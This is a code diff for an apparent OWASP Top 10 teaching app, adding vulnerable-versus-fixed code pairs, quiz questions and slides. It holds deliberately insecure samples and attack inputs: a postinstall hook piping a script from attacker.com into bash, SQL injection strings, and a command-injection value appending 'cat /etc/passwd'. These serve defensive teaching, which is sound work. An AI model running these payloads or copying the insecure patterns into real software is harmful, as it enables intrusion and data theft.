@@ -251,7 +251,7 @@ export const CATEGORIES = [
         id: "CS-A05-1",
         title: "Everyday Web App: SQL Injection Authentication Bypass",
         badge: "Database Query",
-        scenario: "A web application logs users in using raw string concatenation: SELECT * FROM users WHERE user = '" + user + "' AND pass = '" + pass + "'.",
+        scenario: "A web application logs users in using raw string concatenation: SELECT * FROM users WHERE user = 'USER_INPUT' AND pass = 'PASS_INPUT'.",
         vulnerability: "An attacker inputs admin' OR '1'='1' -- into the username field. The query compiles as WHERE user = 'admin' OR '1'='1' -- and ignores the password.",
         impact: "The SQL interpreter evaluates 1=1 as true for every record, logging the attacker in as the first user (the administrator) without a valid password.",
         cleanFix: "Use parameterized queries (prepared statements) with bound variables, ensuring database engines compile the template first and treat input strictly as data."
@@ -597,7 +597,68 @@ app.get('/api/documents/:id', requireLogin, async (req, res) => {
       doc_owner_id: 202
     },
     simulatedVulnerableResult: "HTTP 200 OK — Document data belonging to User 202 disclosed to User 101! (DATA BREACH)",
-    simulatedSecureResult: "HTTP 404 Not Found — Query returned 0 rows for User 101; access blocked securely."
+    simulatedSecureResult: "HTTP 404 Not Found — Query returned 0 rows for User 101; access blocked securely.",
+    examples: [
+      {
+        id: "ex-1",
+        title: "Example 1: Insecure Direct Object Reference (IDOR)",
+        subtitle: "Document access parameter tampering",
+        vulnerableCode: `// INSECURE: Relies entirely on client-supplied ID parameter
+app.get('/api/documents/:id', async (req, res) => {
+  // Directly fetches record without checking who is logged in!
+  const doc = await db.documents.findById(req.params.id);
+  res.json(doc);
+});`,
+        fixedCode: `// SECURE: Enforces server-side authentication & ownership check
+app.get('/api/documents/:id', requireLogin, async (req, res) => {
+  // Query is strictly constrained to the authenticated session ownerId
+  const doc = await db.documents.findOne({
+    id: req.params.id,
+    ownerId: req.user.id
+  });
+
+  if (!doc) {
+    // Return 404 to avoid leaking document existence to unauthorized callers
+    return res.status(404).json({ error: 'Document not found' });
+  }
+
+  res.json(doc);
+});`,
+        whyFixWorks: "The vulnerable pattern allows any user to inspect another user's documents simply by altering the :id parameter. The fixed pattern adds the requireLogin middleware to establish user identity from trusted session cookies, and forces the database query to match both the requested document ID AND the caller's verified ownerId.",
+        testPayload: { userA_id: 101, target_doc_id: 884, doc_owner_id: 202 },
+        simulatedVulnerableResult: "HTTP 200 OK — Document data belonging to User 202 disclosed to User 101! (DATA BREACH)",
+        simulatedSecureResult: "HTTP 404 Not Found — Query returned 0 rows for User 101; access blocked securely."
+      },
+      {
+        id: "ex-2",
+        title: "Example 2: Missing Function-Level Access Control",
+        subtitle: "Administrative endpoint authorization bypass",
+        vulnerableCode: `// INSECURE: Checks if logged in, but neglects user ROLE check!
+app.delete('/api/admin/users/:id', requireLogin, async (req, res) => {
+  // Any logged in basic user can trigger deletion of other accounts!
+  await db.users.deleteOne({ id: req.params.id });
+  res.json({ message: 'User deleted successfully' });
+});`,
+        fixedCode: `// SECURE: Enforces server-side role check & audit logging
+const requireRole = (role) => (req, res, next) => {
+  if (!req.user || req.user.role !== role) {
+    auditLogger.warn({ action: 'UNAUTHORIZED_ADMIN_ATTEMPT', user: req.user?.id });
+    return res.status(403).json({ error: 'Access denied: Requires administrator role' });
+  }
+  next();
+};
+
+app.delete('/api/admin/users/:id', requireLogin, requireRole('super_admin'), async (req, res) => {
+  await db.users.deleteOne({ id: req.params.id });
+  auditLogger.info({ action: 'ADMIN_USER_DELETED', target: req.params.id, actor: req.user.id });
+  res.json({ message: 'User deleted successfully' });
+});`,
+        whyFixWorks: "Client-side interfaces may hide the 'Delete User' button from basic users, but hostile users can issue raw HTTP DELETE requests directly to the API. Server-side role enforcement (RBAC) guarantees that only authenticated callers holding verified administrative roles can execute privileged operations.",
+        testPayload: { user_role: "guest_user", target_delete_id: 509, http_method: "DELETE" },
+        simulatedVulnerableResult: "HTTP 200 OK — Target user 509 deleted by an unauthorized guest user! (PRIVILEGE ESCALATION)",
+        simulatedSecureResult: "HTTP 403 Forbidden — Denied by requireRole middleware; security incident logged."
+      }
+    ]
   },
   {
     id: "LAB-002",
@@ -632,7 +693,76 @@ app.use((err, req, res, next) => {
       action: "Trigger database connection timeout error in production"
     },
     simulatedVulnerableResult: "HTTP 500 — Full stack trace dumped: `Error at /var/app/db/pg.js:42: connection to postgresql://admin:secret@10.0.1.5 failed`",
-    simulatedSecureResult: "HTTP 500 — Generic JSON: `{ error: 'An unexpected internal error occurred', referenceId: 'req-8f92' }`"
+    simulatedSecureResult: "HTTP 500 — Generic JSON: `{ error: 'An unexpected internal error occurred', referenceId: 'req-8f92' }`",
+    examples: [
+      {
+        id: "ex-1",
+        title: "Example 1: Production Error Handling & Stack Trace Leaks",
+        subtitle: "Internal architecture and path disclosure suppression",
+        vulnerableCode: `// INSECURE: Debug error handler dumps internal stack frames
+app.use(errorHandler({
+  showStackTrace: true,
+  dumpExceptions: true
+}));`,
+        fixedCode: `// SECURE: Environment-aware error handling
+const isProduction = process.env.NODE_ENV === 'production';
+
+app.use((err, req, res, next) => {
+  // Securely log technical stack traces to private server logs
+  logger.error({ err, reqId: req.id });
+
+  if (isProduction) {
+    // Sanitized response for public clients
+    return res.status(500).json({
+      error: 'An unexpected internal error occurred',
+      referenceId: req.id
+    });
+  }
+
+  // Developer diagnostic detail strictly limited to development
+  res.status(500).json({ error: err.message, stack: err.stack });
+});`,
+        whyFixWorks: "Detailed stack traces reveal directory structures, database queries, framework versions, and internal source code filenames. The fixed code isolates detailed diagnostics to private server-side logs and presents a sanitized, uniform error message with an incident reference ID to end users in production.",
+        testPayload: { action: "Trigger database connection timeout error in production" },
+        simulatedVulnerableResult: "HTTP 500 — Full stack trace dumped: Error at /var/app/db/pg.js:42: connection to postgresql://admin:secret@10.0.1.5 failed",
+        simulatedSecureResult: "HTTP 500 — Generic JSON: { error: 'An unexpected internal error occurred', referenceId: 'req-8f92' }"
+      },
+      {
+        id: "ex-2",
+        title: "Example 2: Insecure CORS & Missing Security Headers",
+        subtitle: "Overly permissive cross-origin resource sharing",
+        vulnerableCode: `// INSECURE: Wildcard origin combined with credentials allows any domain to steal data!
+app.use((req, res, next) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Credentials', 'true');
+  next();
+});`,
+        fixedCode: `// SECURE: Strict origin allowlist + Helmet HTTP security headers
+const cors = require('cors');
+const helmet = require('helmet');
+
+app.use(helmet({
+  contentSecurityPolicy: { directives: { defaultSrc: ["'self'"] } },
+  hsts: { maxAge: 31536000, includeSubDomains: true }
+}));
+
+const allowedOrigins = ['https://app.corp.com', 'https://admin.corp.com'];
+app.use(cors({
+  origin: (origin, callback) => {
+    if (!origin || allowedOrigins.includes(origin)) {
+      callback(null, true);
+    } else {
+      callback(new Error('Blocked by CORS policy'));
+    }
+  },
+  credentials: true
+}));`,
+        whyFixWorks: "Setting Access-Control-Allow-Origin to * permits arbitrary external malicious websites to make credentialed requests to your API and exfiltrate private user responses. The fixed code uses an explicit allowlist of trusted origins and activates Helmet to set defensive HTTP headers (CSP, HSTS, X-Content-Type-Options).",
+        testPayload: { hostile_origin: "https://evil-phishing-site.com", request_type: "Credentialed Fetch" },
+        simulatedVulnerableResult: "HTTP 200 OK — Evil origin permitted to read sensitive user account JSON via authenticated browser session!",
+        simulatedSecureResult: "HTTP 403 Forbidden — Blocked by strict CORS allowlist; browser disallows response inspection."
+      }
+    ]
   },
   {
     id: "LAB-003",
@@ -666,7 +796,66 @@ app.use((err, req, res, next) => {
       action: "Upstream author pushes compromised version 1.4.3 containing reverse shell"
     },
     simulatedVulnerableResult: "Build pulls rogue version 1.4.3 automatically. Malicious code executes during startup!",
-    simulatedSecureResult: "Build installs pinned 1.4.2 strictly matching lockfile checksum. Upstream poison ignored."
+    simulatedSecureResult: "Build installs pinned 1.4.2 strictly matching lockfile checksum. Upstream poison ignored.",
+    examples: [
+      {
+        id: "ex-1",
+        title: "Example 1: Deterministic Dependency Pinning & Lockfiles",
+        subtitle: "Preventing rogue upstream patch installations",
+        vulnerableCode: `// INSECURE package.json: Wildcards & unpinned dependencies
+{
+  "name": "payment-service",
+  "dependencies": {
+    "auth-token-validator": "*",
+    "crypto-tools": "^2.0.0"
+  }
+}`,
+        fixedCode: `// SECURE package.json: Pinned versions + Lockfile Integrity
+{
+  "name": "payment-service",
+  "dependencies": {
+    "auth-token-validator": "1.4.2",
+    "crypto-tools": "2.1.0"
+  }
+}
+
+// In CI/CD build scripts:
+// 1. Enforce strict reproducible install from package-lock.json:
+//    npm ci --ignore-scripts
+// 2. Audit dependencies for known vulnerabilities:
+//    npm audit --audit-level=high`,
+        whyFixWorks: "Using * or loose version ranges automatically pulls unvetted updates from upstream package registries on every build, creating an open vector for supply-chain malware injection. Pinning versions and running npm ci ensures identical, cryptographically validated packages are installed across development, staging, and production.",
+        testPayload: { action: "Upstream author pushes compromised version 1.4.3 containing reverse shell" },
+        simulatedVulnerableResult: "Build pulls rogue version 1.4.3 automatically. Malicious code executes during startup!",
+        simulatedSecureResult: "Build installs pinned 1.4.2 strictly matching lockfile checksum. Upstream poison ignored."
+      },
+      {
+        id: "ex-2",
+        title: "Example 2: Disabling Insecure Post-Install Lifecycle Scripts",
+        subtitle: "Preventing arbitrary bash execution during npm install",
+        vulnerableCode: `// INSECURE package.json from a third-party package:
+{
+  "name": "cool-color-logger",
+  "scripts": {
+    // Malicious author adds postinstall hook that runs automatically!
+    "postinstall": "curl -s http://attacker.com/telemetry.sh | bash"
+  }
+}`,
+        fixedCode: `// SECURE: Enforce --ignore-scripts in CI/CD & package manager config
+// 1. In your .npmrc file:
+//    ignore-scripts=true
+
+// 2. In Docker / CI Build Pipelines:
+//    RUN npm ci --ignore-scripts
+
+// 3. Scan packages before adding to repository:
+//    npx @socketsecurity/cli info cool-color-logger`,
+        whyFixWorks: "NPM packages can define 'postinstall' scripts that run arbitrary shell code with the permissions of the developer or CI server immediately upon installation. Disabling lifecycle scripts globally with --ignore-scripts neutralizes this vector completely.",
+        testPayload: { dependency: "cool-color-logger@1.0.4", script_trigger: "npm install" },
+        simulatedVulnerableResult: "Bash script executes with developer user permissions; environment tokens sent to external server!",
+        simulatedSecureResult: "Package installed purely as static files; postinstall hook silently suppressed and neutralized."
+      }
+    ]
   },
   {
     id: "LAB-004",
@@ -704,7 +893,74 @@ def verify_password(stored_hash, candidate_password):
       attacker_hardware: "NVIDIA RTX 4090 GPU Cluster"
     },
     simulatedVulnerableResult: "SHA-256 hash cracked in 0.004 seconds using offline rainbow table and dictionary.",
-    simulatedSecureResult: "Argon2id forces 64MB RAM usage per guess. Cracking attempt renders GPU cluster economically infeasible."
+    simulatedSecureResult: "Argon2id forces 64MB RAM usage per guess. Cracking attempt renders GPU cluster economically infeasible.",
+    examples: [
+      {
+        id: "ex-1",
+        title: "Example 1: Adaptive Memory-Hard Hashing (Argon2id vs SHA-256)",
+        subtitle: "Resisting offline GPU brute-force password cracking",
+        vulnerableCode: `// INSECURE: Fast cryptographic digest (crackable in milliseconds on GPUs)
+const crypto = require('crypto');
+
+function hashPassword(password) {
+  // SHA-256 is designed to run in nanoseconds on commodity graphics cards!
+  return crypto.createHash('sha256').update(password).digest('hex');
+}`,
+        fixedCode: `// SECURE: Memory-hard, adaptive hashing recommended by OWASP 2025
+const argon2 = require('argon2');
+
+async function hashPassword(password) {
+  // Argon2id requires significant RAM and CPU time, neutralizing GPU cracking
+  return await argon2.hash(password, {
+    type: argon2.argon2id,
+    memoryCost: 65536, // 64 MB RAM
+    timeCost: 3,       // 3 iterations
+    parallelism: 1
+  });
+}
+
+async function verifyPassword(hash, password) {
+  return await argon2.verify(hash, password);
+}`,
+        whyFixWorks: "General-purpose digests like SHA-256 are computationally lightweight, allowing high-performance GPUs to compute billions of guesses per second against leaked databases. Argon2id incorporates cryptographic memory hardness and tunable time costs, making mass offline cracking economically and computationally infeasible.",
+        testPayload: { password_input: "P@ssw0rd2025!", algorithm: "Hashcat GPU Rig" },
+        simulatedVulnerableResult: "Attacker GPU rig tests 4.2 billion guesses/second; password cracked in 1.4 seconds!",
+        simulatedSecureResult: "Argon2id memory hardness caps cracking rig to ~25 guesses/second; cracking would take 4,800 years."
+      },
+      {
+        id: "ex-2",
+        title: "Example 2: Secure Secret Key Management (Cloud KMS vs Hardcoded)",
+        subtitle: "Eliminating hardcoded symmetric keys in source control",
+        vulnerableCode: `// INSECURE: Plaintext symmetric key committed into Git repository
+const crypto = require('crypto');
+const AES_KEY = 'MySuperSecretCompanyKey12345678!'; // Leaks in git history!
+
+function encryptRecord(plaintext) {
+  const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(AES_KEY), iv);
+  return cipher.update(plaintext, 'utf8', 'hex') + cipher.final('hex');
+}`,
+        fixedCode: `// SECURE: Envelope encryption via Cloud Key Management Service (AWS KMS)
+const { KMSClient, GenerateDataKeyCommand } = require('@aws-sdk/client-kms');
+const kms = new KMSClient({ region: 'us-east-1' });
+
+async function getEncryptionKey() {
+  // Data key generated dynamically in HSM; never stored in source code
+  const cmd = new GenerateDataKeyCommand({
+    KeyId: process.env.KMS_MASTER_KEY_ARN,
+    KeySpec: 'AES_256'
+  });
+  const response = await kms.send(cmd);
+  return {
+    plaintextKey: response.Plaintext,
+    encryptedKeyBlob: response.CiphertextBlob
+  };
+}`,
+        whyFixWorks: "Hardcoded secret keys in code repositories are permanently exposed to anyone with code read access and are easily captured by automated git scraping bots. Cloud KMS stores master keys in dedicated tamper-proof Hardware Security Modules (HSMs) and dynamically generates envelope keys with automated audit logging.",
+        testPayload: { repository_scan: "TruffleHog / GitGuardian scan on public repository" },
+        simulatedVulnerableResult: "Git commit history flags exposed AES_KEY string; attacker decrypts database backups!",
+        simulatedSecureResult: "Zero keys in source code; access governed by strict IAM roles and CloudTrail audit logging."
+      }
+    ]
   },
   {
     id: "LAB-005",
@@ -726,7 +982,62 @@ def search_user(email):
       email_input: "admin@corp.com' OR '1'='1' --"
     },
     simulatedVulnerableResult: "Query compiles as: `SELECT * FROM users WHERE email = 'admin@corp.com' OR '1'='1' --'`. Dumps entire user database!",
-    simulatedSecureResult: "Query looks for user with literal email matching the entire string. Safely returns 0 matches."
+    simulatedSecureResult: "Query looks for user with literal email matching the entire string. Safely returns 0 matches.",
+    examples: [
+      {
+        id: "ex-1",
+        title: "Example 1: SQL Injection via Parameterized Queries",
+        subtitle: "Separating database query syntax from user input",
+        vulnerableCode: `# INSECURE: String formatting combines SQL command with user input
+def search_user(email):
+    # Raw string concatenation allows hostile input to alter SQL syntax
+    query = f"SELECT * FROM users WHERE email = '{email}'"
+    return db.cursor().execute(query).fetchall()`,
+        fixedCode: `# SECURE: Parameterized prepared statement
+def search_user(email):
+    # Database compiles query structure FIRST; treats email strictly as literal data
+    query = "SELECT * FROM users WHERE email = %s"
+    return db.cursor().execute(query, (email,)).fetchall()`,
+        whyFixWorks: "When raw strings are concatenated, the SQL interpreter cannot distinguish between the developer's SQL commands and the user's data. Parameterized queries compile the SQL statement execution plan before binding parameters, guaranteeing that quotes and SQL keywords like OR or DROP are treated strictly as innocent literal text.",
+        testPayload: { email_input: "admin@corp.com' OR '1'='1' --" },
+        simulatedVulnerableResult: "Query compiles as: SELECT * FROM users WHERE email = 'admin@corp.com' OR '1'='1' --'. Dumps entire user database!",
+        simulatedSecureResult: "Query looks for user with literal email matching the entire string. Safely returns 0 matches."
+      },
+      {
+        id: "ex-2",
+        title: "Example 2: OS Command Injection via Safe Argument Arrays",
+        subtitle: "Executing system binaries without invoking a command shell",
+        vulnerableCode: `// INSECURE: Child process executes system shell with concatenated input
+const { exec } = require('child_process');
+
+app.post('/api/ping', (req, res) => {
+  // Shell interprets semicolons or ampersands as command delimiters!
+  exec(\`ping -c 4 \${req.body.host}\`, (err, stdout) => {
+    res.send(stdout);
+  });
+});`,
+        fixedCode: `// SECURE: execFile invokes binary directly without a system shell
+const { execFile } = require('child_process');
+const validator = require('validator');
+
+app.post('/api/ping', (req, res) => {
+  const host = req.body.host;
+  // Strict allowlist validation: must be a valid IPv4/IPv6 or FQDN
+  if (!validator.isIP(host) && !validator.isFQDN(host)) {
+    return res.status(400).json({ error: 'Invalid hostname format' });
+  }
+
+  // execFile does NOT invoke /bin/sh; parameters are passed as literal arguments
+  execFile('/bin/ping', ['-c', '4', host], { timeout: 5000 }, (err, stdout) => {
+    res.send(stdout);
+  });
+});`,
+        whyFixWorks: "child_process.exec invokes a full system shell (/bin/sh or cmd.exe), enabling shell metacharacters like ;, |, or && to chain arbitrary commands. Using execFile bypasses the shell entirely, invoking the ping binary directly with arguments passed as separate array elements.",
+        testPayload: { host: "8.8.8.8; cat /etc/passwd" },
+        simulatedVulnerableResult: "Shell executes ping and then executes cat /etc/passwd; sensitive system passwords dumped!",
+        simulatedSecureResult: "Validator rejects hostile format with HTTP 400; execFile treats string strictly as argument."
+      }
+    ]
   },
   {
     id: "LAB-006",
@@ -774,7 +1085,85 @@ app.post('/api/login', loginLimiter, async (req, res) => {
       action: "Script fires 50 automated guesses within 5 seconds"
     },
     simulatedVulnerableResult: "50 attempts processed immediately; leaks whether target user exists in database.",
-    simulatedSecureResult: "5th attempt triggers HTTP 429 Too Many Requests; automated attack throttled and blocked."
+    simulatedSecureResult: "5th attempt triggers HTTP 429 Too Many Requests; automated attack throttled and blocked.",
+    examples: [
+      {
+        id: "ex-1",
+        title: "Example 1: Rate Limiting & Constant-Time Verification",
+        subtitle: "Mitigating automated credential stuffing and account enumeration",
+        vulnerableCode: `// INSECURE: Unlimited attempts & informative error leakage
+app.post('/api/login', async (req, res) => {
+  const user = await db.users.find({ email: req.body.email });
+  if (!user) {
+    return res.status(404).send('Email not registered'); // Leaks existence!
+  }
+  if (user.password !== req.body.password) {
+    return res.status(401).send('Incorrect password');
+  }
+  res.json({ token: createSession(user) });
+});`,
+        fixedCode: `// SECURE: Rate limiting, constant-time verification & uniform error
+const rateLimit = require('express-rate-limit');
+
+const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000, // 15 minute window
+  max: 5,                   // 5 failed attempts per IP
+  message: { error: 'Too many login attempts. Please try again in 15 minutes.' }
+});
+
+app.post('/api/login', loginLimiter, async (req, res) => {
+  const { email, password } = req.body;
+  const user = await db.users.find({ email });
+
+  // Uniform failure response & dummy crypto calculation to eliminate timing leaks
+  if (!user || !(await verifyPassword(user.passwordHash, password))) {
+    return res.status(401).json({ error: 'Invalid email or password' });
+  }
+
+  res.json({ token: createSecureSessionToken(user) });
+});`,
+        whyFixWorks: "Differentiating error messages allows credential stuffers to discover registered email addresses. Missing rate limits allow rapid dictionary attacks. The secure version caps attempts to 5 per 15 minutes, returns a uniform failure message, and executes dummy cryptographic work for nonexistent accounts to eliminate timing side-channels.",
+        testPayload: { action: "Script fires 50 automated guesses within 5 seconds" },
+        simulatedVulnerableResult: "50 attempts processed immediately; leaks whether target user exists in database.",
+        simulatedSecureResult: "5th attempt triggers HTTP 429 Too Many Requests; automated attack throttled and blocked."
+      },
+      {
+        id: "ex-2",
+        title: "Example 2: Session Fixation & Cryptographic Regeneration",
+        subtitle: "Regenerating session IDs upon privilege elevation",
+        vulnerableCode: `// INSECURE: Preserves pre-authentication session cookie
+app.post('/login', async (req, res) => {
+  const user = await authenticate(req.body);
+  if (user) {
+    // Session ID is NOT regenerated; attacker who knows pre-login ID now has access!
+    req.session.authenticatedUser = user.id;
+    res.json({ status: 'Logged in' });
+  }
+});`,
+        fixedCode: `// SECURE: Regenerates session identifier upon successful authentication
+app.post('/login', async (req, res) => {
+  const user = await authenticate(req.body);
+  if (!user) {
+    return res.status(401).json({ error: 'Invalid credentials' });
+  }
+
+  // Invalidate old pre-login session and issue a fresh cryptographically random ID
+  req.session.regenerate((err) => {
+    if (err) return res.status(500).json({ error: 'Session regeneration failed' });
+
+    req.session.authenticatedUser = user.id;
+    req.session.cookie.httpOnly = true;
+    req.session.cookie.secure = true;
+    req.session.cookie.sameSite = 'strict';
+    res.json({ status: 'Authenticated successfully with fresh session token' });
+  });
+});`,
+        whyFixWorks: "In session fixation, an attacker tricks the victim into using a known session token before logging in. When the victim authenticates, the server associates that known session with the victim's account. Regenerating the session ID immediately upon authentication destroys the old token and issues an unguessable new ID.",
+        testPayload: { pre_planted_session_id: "attacker_known_token_8829" },
+        simulatedVulnerableResult: "Session authenticated with old token; attacker accesses victim account using pre-planted cookie!",
+        simulatedSecureResult: "Old token invalidated; server issues fresh token. Attacker's cookie is completely dead."
+      }
+    ]
   }
 ];
 
@@ -1267,4 +1656,266 @@ export const QUESTION_SETS = [
         question: "How can path traversal (e.g. '../../etc/passwd') be prevented in file retrieval endpoints?",
         options: [
           "By hiding the file download button with CSS",
-          "By sani
+          "By sanitizing filenames, using allowlists, and resolving paths against a restricted canonical base directory",
+          "By renaming all files to longer filenames",
+          "By disabling file compression on the web server"
+        ],
+        answer: 1,
+        explanation: "Resolving canonical paths ensures dot-dot-slash sequences cannot break outside of the intended root directory.",
+        evidenceUrl: "https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/"
+      },
+      {
+        id: "Q3-04",
+        owasp: "A02:2025",
+        question: "What security risk occurs when setting 'Access-Control-Allow-Origin: *' with 'Access-Control-Allow-Credentials: true'?",
+        options: [
+          "It prevents cross-origin requests from completing successfully",
+          "It allows arbitrary external websites to read authenticated user responses and steal private data",
+          "It changes the web page theme styling",
+          "It deletes user cookies automatically"
+        ],
+        answer: 1,
+        explanation: "Overly permissive CORS allows malicious origins visited by authenticated users to issue credentialed requests and exfiltrate data.",
+        evidenceUrl: "https://top10.owasp.org/2025/A02_2025-Security_Misconfiguration/"
+      },
+      {
+        id: "Q3-05",
+        owasp: "A02:2025",
+        question: "Why should legacy or unnecessary HTTP methods (such as TRACE or WebDAV) be disabled on production web servers?",
+        options: [
+          "They reduce attack surface and prevent Cross-Site Tracing (XST) credential harvesting",
+          "They make web pages load faster for mobile devices",
+          "They require expensive software license renewals",
+          "They interfere with automated database backups"
+        ],
+        answer: 0,
+        explanation: "Disabling unused HTTP methods reduces attack surface and prevents debugging exploits like Cross-Site Tracing.",
+        evidenceUrl: "https://top10.owasp.org/2025/A02_2025-Security_Misconfiguration/"
+      },
+      {
+        id: "Q3-06",
+        owasp: "A02:2025",
+        question: "What is automated configuration drift detection in containerized cloud infrastructure?",
+        options: [
+          "A tool that tracks user mouse movements on web pages",
+          "Continuously auditing live production settings against hardened baseline infrastructure-as-code templates",
+          "Automatically updating typography on web applications",
+          "Generating marketing emails for inactive users"
+        ],
+        answer: 1,
+        explanation: "Configuration drift detection alerts security teams whenever manual changes or rogue settings deviate from hardened baseline policies.",
+        evidenceUrl: "https://top10.owasp.org/2025/A02_2025-Security_Misconfiguration/"
+      },
+      {
+        id: "Q3-07",
+        owasp: "A03:2025",
+        question: "What occurs during a 'dependency confusion' attack in software development?",
+        options: [
+          "A developer forgets which package version they installed",
+          "A package manager pulls a malicious public package with the same name as an internal private enterprise library",
+          "A compiler generates confusing error warnings",
+          "An application allocates too much RAM during startup"
+        ],
+        answer: 1,
+        explanation: "Attackers register public packages matching private internal library names, tricking build systems into pulling untrusted code.",
+        evidenceUrl: "https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/"
+      },
+      {
+        id: "Q3-08",
+        owasp: "A03:2025",
+        question: "Why can untrusted 'postinstall' scripts in open-source dependencies present a severe security threat?",
+        options: [
+          "They take too long to run on slow hardware",
+          "They execute arbitrary shell commands with developer or build-server permissions during package installation",
+          "They require node.js to be restarted manually",
+          "They overwrite package.json documentation comments"
+        ],
+        answer: 1,
+        explanation: "'postinstall' scripts execute automatically during 'npm install', allowing malicious packages to exfiltrate SSH keys and environment secrets.",
+        evidenceUrl: "https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/"
+      },
+      {
+        id: "Q3-09",
+        owasp: "A03:2025",
+        question: "How does cryptographic Subresource Integrity (SRI) protect web applications importing external CDN scripts?",
+        options: [
+          "It speeds up external CDN network script delivery",
+          "It allows browsers to verify that fetched CDN scripts match an expected cryptographic hash before execution",
+          "It converts client JavaScript into compiled WebAssembly",
+          "It automatically updates external scripts to new releases"
+        ],
+        answer: 1,
+        explanation: "SRI ensures that if a third-party CDN is compromised and malicious code is injected, client browsers reject the script due to hash mismatch.",
+        evidenceUrl: "https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/"
+      },
+      {
+        id: "Q3-10",
+        owasp: "A04:2025",
+        question: "What is the minimum recommended version of Transport Layer Security (TLS) for modern secure communications?",
+        options: [
+          "SSL 2.0",
+          "TLS 1.0",
+          "TLS 1.3 (or strictly configured TLS 1.2)",
+          "HTTP 0.9"
+        ],
+        answer: 2,
+        explanation: "Older versions (SSL 3.0, TLS 1.0/1.1) suffer from known cryptographic vulnerabilities (POODLE, BEAST). TLS 1.3 eliminates obsolete cipher suites.",
+        evidenceUrl: "https://top10.owasp.org/2025/A04_2025-Cryptographic_Failures/"
+      },
+      {
+        id: "Q3-11",
+        owasp: "A04:2025",
+        question: "What is Authenticated Encryption with Associated Data (AEAD) such as AES-256-GCM?",
+        options: [
+          "An algorithm that compresses images before encryption",
+          "An encryption mode that simultaneously guarantees confidentiality and cryptographic message integrity",
+          "A method of storing plaintext keys in volatile memory",
+          "A hashing algorithm for credit card numbers"
+        ],
+        answer: 1,
+        explanation: "AEAD modes provide encryption while validating an authentication tag, preventing tampering and padding oracle attacks.",
+        evidenceUrl: "https://top10.owasp.org/2025/A04_2025-Cryptographic_Failures/"
+      },
+      {
+        id: "Q3-12",
+        owasp: "A04:2025",
+        question: "Why are pseudo-random number generators (PRNGs) like 'Math.random()' forbidden for security tokens?",
+        options: [
+          "They are non-cryptographic and their internal state can be mathematically predicted by attackers",
+          "They only generate odd numbers",
+          "They run too slowly on modern CPUs",
+          "They require root operating system permissions"
+        ],
+        answer: 0,
+        explanation: "'Math.random()' uses non-cryptographic algorithms (like XorShift). Cryptographic tokens require CSPRNGs (crypto.randomBytes).",
+        evidenceUrl: "https://top10.owasp.org/2025/A04_2025-Cryptographic_Failures/"
+      },
+      {
+        id: "Q3-13",
+        owasp: "A05:2025",
+        question: "What differentiates OS Command Injection from SQL Injection?",
+        options: [
+          "Command injection targets the underlying operating system shell; SQL injection targets database query interpreters",
+          "Command injection occurs only on Mac; SQL injection occurs on Windows",
+          "Command injection uses CSS; SQL injection uses HTML",
+          "There is no difference between them"
+        ],
+        answer: 0,
+        explanation: "OS command injection executes host commands (e.g. rm, cat /etc/passwd) via system shells, whereas SQL injection targets database interpreters.",
+        evidenceUrl: "https://top10.owasp.org/2025/A05_2025-Injection/"
+      },
+      {
+        id: "Q3-14",
+        owasp: "A05:2025",
+        question: "Why is contextual output encoding required even when input validation is present?",
+        options: [
+          "It makes database queries run faster",
+          "It neutralizes control characters tailored specifically to the execution context (HTML body, attribute, JavaScript, or URL)",
+          "It compresses webpage source code",
+          "It automatically encrypts user passwords"
+        ],
+        answer: 1,
+        explanation: "Characters safe in one context (e.g. an HTML body) can be dangerous in an attribute or script tag. Contextual encoding ensures safe rendering.",
+        evidenceUrl: "https://top10.owasp.org/2025/A05_2025-Injection/"
+      },
+      {
+        id: "Q3-15",
+        owasp: "A07:2025",
+        question: "What is Session Fixation, and how should web servers prevent it?",
+        options: [
+          "An error where a user session never expires",
+          "An attack where an attacker forces a known session ID onto a user; prevented by invalidating and reissuing a new session token upon authentication",
+          "Fixing database connection pool timeouts",
+          "Restricting users to 1 device only"
+        ],
+        answer: 1,
+        explanation: "In session fixation, the attacker sets a session ID before login. Regenerating session tokens upon authentication neutralizes this attack.",
+        evidenceUrl: "https://top10.owasp.org/2025/A07_2025-Authentication_Failures/"
+      }
+    ]
+  }
+];
+
+export const QUIZ_QUESTIONS = QUESTION_SETS[0].questions;
+
+export const PRESENTATION_SLIDES = [
+  {
+    num: "01",
+    title: "CAPSTONE 9: AI OWASP Top 10 Tutor",
+    subtitle: "How accurately can AI explain common web application risks, and how can explanations be verified against official OWASP material?",
+    bullets: [
+      "Evaluating LLM accuracy, hallucinations, and security advice in software education.",
+      "Comparing unconstrained generation vs. evidence-anchored prompting.",
+      "Auditing outputs against canonical OWASP Top 10:2025 release.",
+      "Demonstrating end-to-end verification and defensive code hardening."
+    ]
+  },
+  {
+    num: "02",
+    title: "Scope & Empirical Methodology",
+    subtitle: "Structured Matrix Across 6 Vulnerabilities, 3 Frontier Models, and 2 Strategies",
+    bullets: [
+      "6 Categories: A01 (Access Control), A02 (Misconfiguration), A03 (Supply Chain), A04 (Crypto), A05 (Injection), A07 (Auth).",
+      "3 AI Engines: OpenAI ChatGPT (GPT-4o), Google Gemini (Gemini 1.5 Pro), Anthropic Claude (Claude 3.5 Sonnet).",
+      "Strategy A: Baseline conversational prompting without documentation anchoring.",
+      "Strategy B: Evidence-constrained prompting with required citation trails and uncertainty self-checks."
+    ]
+  },
+  {
+    num: "03",
+    title: "System Architecture: How the Tutor Works",
+    subtitle: "A Closed-Loop Pipeline for AI Security Verification",
+    bullets: [
+      "Official Source Ingestion: Source register links every concept to canonical 2025 documentation.",
+      "Dual-Tier Generation: Produces beginner conceptual analogies and advanced architectural mechanisms.",
+      "Verification Engine: Extracts claims, cross-references sources, and assigns 5-tier audit statuses.",
+      "Defensive Code Verification: Pairs vulnerable and hardened patterns with reproducible local test cases."
+    ]
+  },
+  {
+    num: "04",
+    title: "AI Evaluation Results & Key Findings",
+    subtitle: "Quantifying Accuracy, Grounding, and Hallucination Reduction",
+    bullets: [
+      "Strategy A Accuracy: 72.5% — High fluency masked dangerous architectural flaws.",
+      "Strategy B Accuracy: 96.8% — Grounding eliminated 100% of critical security misconceptions.",
+      "Identified Strategy A Hallucinations: Recommending UI button hiding for access control; suggesting plain SHA-256 for passwords.",
